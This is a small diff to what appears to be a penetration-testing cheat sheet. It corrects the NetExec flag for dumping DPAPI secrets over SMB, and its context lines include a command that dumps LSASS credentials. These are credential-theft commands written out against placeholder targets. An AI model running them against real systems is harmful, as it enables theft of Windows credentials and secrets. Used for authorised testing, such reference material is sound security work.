@@ -807,7 +807,7 @@ netexec smb <target-ip> -u <user> -p <password> -M lsassy
 
 ### Dump DPAPI
 ```shell
-netexec smb <target-ip> -u <user> -p <password> -dpapi
+netexec smb <target-ip> -u <user> -p <password> --dpapi
 ```
 
 ### Dump PowerShell History
